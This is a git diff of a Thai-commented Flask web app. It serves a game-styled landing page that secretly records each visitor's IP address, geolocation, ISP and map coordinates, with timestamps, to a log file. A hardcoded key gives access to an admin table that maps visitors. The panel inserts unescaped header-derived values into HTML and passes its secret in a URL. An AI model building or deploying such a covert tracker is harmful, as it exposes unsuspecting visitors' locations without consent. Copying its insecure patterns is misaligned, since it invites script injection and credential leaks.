@@ -1,13 +1,14 @@
 from flask import Flask, request
 import requests
 import os
+from datetime import datetime
 
 app = Flask(__name__)
 
-# 🔐 รหัสเข้า admin
+# 🔐 เปลี่ยนรหัสตรงนี้
 ADMIN_KEY = "0949205717As"
 
-# 🌍 หน้าเว็บหลัก (สไตล์เกม)
+# 🎮 หน้าเว็บหลัก (สไตล์เกม)
 @app.route("/")
 def home():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
@@ -17,14 +18,16 @@ def home():
         country = data.get("country", "Unknown")
         city = data.get("city", "Unknown")
         org = data.get("org", "Unknown")
-        loc = data.get("loc", "0,0")  # lat,long
+        loc = data.get("loc", "0,0")
     except:
         country = city = org = "Unknown"
         loc = "0,0"
 
-    # บันทึก log
+    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+    # 📝 บันทึก log
     with open("log.txt", "a", encoding="utf-8") as f:
-        f.write(f"{ip}|{country}|{city}|{org}|{loc}\n")
+        f.write(f"{time}|{ip}|{country}|{city}|{org}|{loc}\n")
 
     return """
     <!DOCTYPE html>
@@ -86,6 +89,7 @@ def home():
 @app.route("/admin")
 def admin():
     key = request.args.get("key")
+
     if key != ADMIN_KEY:
         return "Access Denied ❌"
 
@@ -94,24 +98,26 @@ def admin():
     try:
         with open("log.txt", "r", encoding="utf-8") as f:
             for line in f:
-                ip, country, city, org, loc = line.strip().split("|")
+                time, ip, country, city, org, loc = line.strip().split("|")
                 lat, lon = loc.split(",")
 
                 map_link = f"https://www.google.com/maps?q={lat},{lon}"
 
                 rows += f"""
                 <tr>
+                    <td>{time}</td>
                     <td>{ip}</td>
                     <td>{country}</td>
                     <td>{city}</td>
                     <td>{org}</td>
-                    <td><a href="{map_link}" target="_blank">ดูแผนที่</a></td>
+                    <td><a href="{map_link}" target="_blank">📍 Map</a></td>
                 </tr>
                 """
     except:
-        rows = "<tr><td colspan='5'>No data</td></tr>"
+        rows = "<tr><td colspan='6'>No data</td></tr>"
 
     return f"""
+    <!DOCTYPE html>
     <html>
     <head>
     <title>Admin Panel</title>
@@ -121,6 +127,9 @@ def admin():
         color: white;
         font-family: Arial;
         padding: 20px;
+    }}
+    h1 {{
+        text-align: center;
     }}
     table {{
         width: 100%;
@@ -148,6 +157,7 @@ def admin():
 
     <table>
         <tr>
+            <th>Time</th>
             <th>IP</th>
             <th>Country</th>
             <th>City</th>
